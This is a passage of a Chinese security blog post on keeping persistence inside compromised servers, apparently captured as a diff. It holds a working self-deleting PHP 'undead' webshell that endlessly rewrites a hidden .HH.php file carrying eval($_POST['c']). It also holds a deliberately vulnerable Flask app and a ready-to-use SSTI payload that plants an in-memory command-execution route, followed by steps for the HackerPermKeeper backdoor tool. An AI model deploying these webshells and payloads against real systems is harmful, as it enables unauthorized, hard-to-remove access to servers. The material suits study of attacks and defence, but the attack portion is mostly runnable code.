+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">set_time_limit</span><span class="p">(</span><span class="n">0</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@unlink</span><span class="p">(</span><span class="n">__FILE__</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">$file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">&#39;</span><span class="p">.</span><span class="na">HH</span><span class="p">.</span><span class="na">php</span><span class="err">&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">$code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">&#39;</span><span class="o">&lt;?</span><span class="n">php</span><span class="w"> </span><span class="nd">@eval</span><span class="p">(</span><span class="n">$_POST</span><span class="o">[</span><span class="err">\&#39;</span><span class="n">c</span><span class="err">\&#39;</span><span class="o">]</span><span class="p">);</span><span class="w"> </span><span class="o">?&gt;</span><span class="err">&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">1</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">file_put_contents</span><span class="p">(</span><span class="n">$file</span><span class="p">,</span><span class="n">$code</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">usleep</span><span class="p">(</span><span class="n">5000</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ignore_user_abort</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">     </span><span class="err">##</span><span class="n">代表该代码只要运行了就不会断开</span><span class="err">、</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">set_time_limit</span><span class="p">(</span><span class="n">0</span><span class="p">);</span><span class="w">     </span><span class="err">##</span><span class="n">该代码运行的时间</span><span class="err">，</span><span class="n">设置为0就是一致运行</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@unlink</span><span class="p">(</span><span class="n">__FILE__</span><span class="p">);</span><span class="w">        </span><span class="err">##</span><span class="n">删除文件</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nf">while</span><span class="w"> </span><span class="p">(</span><span class="n">1</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">file_put_contents</span><span class="p">(</span><span class="n">$file</span><span class="p">,</span><span class="n">$code</span><span class="p">);</span><span class="w">    </span><span class="err">##</span><span class="w"> </span><span class="n">死循环创建文件并且写入</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="nf">usleep</span><span class="p">(</span><span class="n">5000</span><span class="p">);</span><span class="w">   </span><span class="err">##</span><span class="n">延时</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>访问这个不死马，会一直转圈圈，此时会生成一个.HH.php隐藏文件，直接连接这个隐藏文件即可，这个不死马会自动删除自己，只要浏览器没有在访问，你也可以直接删除这个文件</strong></p>
+<p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/40.png"
+	width="1527"
+	height="905"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/40_hu_22ba4fb717c7ce9c.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/40_hu_41317d5d72f57da0.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="168"
+		data-flex-basis="404px"
+	
+></p>
+<p><strong>当你删除这个.HH.php文件时，不死马会一直生成这个文件，解决办法就是重启中间件，或者写脚本条件竞争进行删除</strong></p>
+<h2 id="32python内存马">3.2.Python内存马
+</h2><p><a class="link" href="https://xz.aliyun.com/news/10381"  target="_blank" rel="noopener"
+    >https://xz.aliyun.com/news/10381</a></p>
+<p><strong><font style="color:rgb(77, 77, 77);">漏洞代码，这段代码中有ssti注入漏洞</font></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">from</span><span class="w"> </span><span class="n">flask</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="nn">Flask</span><span class="p">,</span><span class="w"> </span><span class="n">request</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">from</span><span class="w"> </span><span class="n">flask</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="nn">render_template_string</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">app</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@app.route</span><span class="p">(</span><span class="sc">&#39;/&#39;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">def</span><span class="w"> </span><span class="nf">hello_world</span><span class="p">():</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="err">&#39;</span><span class="n">Hello</span><span class="w"> </span><span class="n">World</span><span class="err">&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@app.route</span><span class="p">(</span><span class="err">&#39;</span><span class="o">/</span><span class="n">test</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">methods</span><span class="o">=[</span><span class="err">&#39;</span><span class="n">GET</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="n">POST</span><span class="err">&#39;</span><span class="o">]</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">def</span><span class="w"> </span><span class="nf">test</span><span class="p">():</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">template</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;&#39;&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="o">&lt;</span><span class="n">div</span><span class="w"> </span><span class="kd">class</span><span class="err">=&#34;</span><span class="nc">center</span><span class="o">-</span><span class="n">content</span><span class="w"> </span><span class="n">error</span><span class="s">&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">            &lt;h1&gt;Oops! That page doesn&#39;t exist.&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">            &lt;h3&gt;%s&lt;/h3&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">        &lt;/div&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="s">    &#39;&#39;&#39; % (request.values.get(&#39;param&#39;))
+</span></span></span><span class="line"><span class="cl"><span class="s">
+</span></span></span><span class="line"><span class="cl"><span class="s">    return render_template_string(template)
+</span></span></span><span class="line"><span class="cl"><span class="s">
+</span></span></span><span class="line"><span class="cl"><span class="s">
+</span></span></span><span class="line"><span class="cl"><span class="s">if __name__ == &#39;__main__&#39;:
+</span></span></span><span class="line"><span class="cl"><span class="s">    app.run(port=5000)
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">http</span><span class="p">:</span><span class="c1">//127.0.0.1:8000/test?param={{url_for.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell%27,%20%27shell%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27whoami%27)).read())%22,{%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]})}}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">直接访问</span><span class="err">：</span><span class="n">http</span><span class="p">:</span><span class="c1">//127.0.0.1:5000/shell?cmd=whoami</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/41.png"
+	width="1197"
+	height="292"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/41_hu_d9015860a9c5776e.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/41_hu_97322d739c9d87e1.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="409"
+		data-flex-basis="983px"
+	
+></p>
+<p><strong>执行发现，shell文件并不存在，但是能执行命令，日志中也有记录</strong></p>
+<p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/42.png"
+	width="2098"
+	height="1134"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/42_hu_47fcbadfcdb00d29.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/42_hu_b764362f057d387d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="185"
+		data-flex-basis="444px"
+	
+></p>
+<h2 id="33java内存马">3.3.Java内存马
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Java</span><span class="w"> </span><span class="n">Instrumentation类</span><span class="err">（</span><span class="n">Agent型</span><span class="err">）</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Servlet</span><span class="o">-</span><span class="n">api类</span><span class="w"> </span><span class="err">（</span><span class="n">Servlet型</span><span class="err">，</span><span class="n">Listener型</span><span class="err">，</span><span class="n">Filter型</span><span class="err">）</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Spring类</span><span class="w"> </span><span class="err">（</span><span class="n">Controller型</span><span class="err">，</span><span class="n">Interceptor型</span><span class="err">）</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="linux权限维持工具hackerpermkeeper使用">Linux权限维持工具&mdash;HackerPermKeeper使用
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">python</span><span class="w"> </span><span class="n">main</span><span class="p">.</span><span class="na">py</span><span class="w"> </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="n">13</span><span class="w">          </span><span class="c1">//生成检测脚本，判断服务器适用于哪种方法进行权限维持       </span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/43.png"
+	width="1160"
+	height="876"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/43_hu_44c60335de0754ab.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/43_hu_4325d9654cbfd8a3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="132"
+		data-flex-basis="317px"
+	
+></p>
+<p><strong>在目标主机上适用检测脚本进行检查，前提是目标主机需要有Python环境才能运行</strong></p>
+<p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/44.png"
+	width="1085"
+	height="964"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/44_hu_7744a7f2bf02451a.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/44_hu_69713b3d1baddebc.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="112"
+		data-flex-basis="270px"
+	
+></p>
+<p><strong>查看可能存在权限维持的情况在回到主机运行对应的模块，如这里我测试SSH软链接后门</strong></p>
+<p><strong>输入对应的模块号，他会给你返回攻击脚本</strong></p>
+<p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/45.png"
+	width="1215"
+	height="893"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/45_hu_bb0ef804f6c5d674.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/45_hu_c2aeef2506784a7f.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="136"
+		data-flex-basis="326px"
+	
+></p>
+<p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/46.png"
+	width="1273"
+	height="630"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/46_hu_606450d8e3472924.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/46_hu_b9f20dd23d2e382.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="202"
+		data-flex-basis="484px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>By Lsec</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Sep 12, 2025 22:11 &#43;0800
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/%E5%86%85%E7%BD%91%E8%BF%9C%E6%8E%A7%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E5%86%85%E7%BD%91%E8%BF%9C%E6%8E%A7%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/logo.27e26041cc2856a527adabb8c78494ea_hu_cc9bfe2f1440a103.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 内网远控工具利用思路"
+                        
+                        data-hash="md5-J&#43;JgQcwoVqUnrau4x4SU6g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">内网远控工具利用思路</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/">
+        
+        
+            <div class="article-image">
+                <img src="/p/android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/logo.2f72206d01f27f5ac5d94e76679a02e4_hu_2a2f619f1c021c7c.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Android逆向基础"
+                        
+                        data-hash="md5-L3IgbQHyf1rF2U52Z5oC5A==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Android逆向基础</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%B0%83%E8%AF%95%E5%9F%BA%E7%A1%80/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%B0%83%E8%AF%95%E5%9F%BA%E7%A1%80/logo.58e5bcb0bd3d1324eccad2c3f1e6533d_hu_30f56b4785c67b3c.jpeg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 浏览器调试基础"
+                        
+                        data-hash="md5-WOW8sL09EyTsytLD8eZTPQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">浏览器调试基础</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/springboot%E6%8E%A5%E5%8F%A3%E7%AD%BE%E5%90%8D%E5%AE%9E%E8%B7%B5/">
+        
+        
+            <div class="article-image">
+                <img src="/p/springboot%E6%8E%A5%E5%8F%A3%E7%AD%BE%E5%90%8D%E5%AE%9E%E8%B7%B5/logo.ec7efaecf7880bf687168c2a838241a2_hu_879f836f1a4679a6.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post SpringBoot接口签名实践"
+                        
+                        data-hash="md5-7H767PeIC/aHFowqg4JBog==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SpringBoot接口签名实践</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/logo.eaf9caf191c430d0e5613ac24de20504_hu_e2b29ff36e7d23e5.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 文件上传漏洞"
+                        
+                        data-hash="md5-6vnK8ZHEMNDlYTrCTeIFBA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">文件上传漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 Lsec&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>���¹鵵ҳ</title>
+    
+    <script defer src="https://cn.vercount.one/js"></script>
+</head>
+<body>
+</body>
+</html>
+    </body>
+</html>
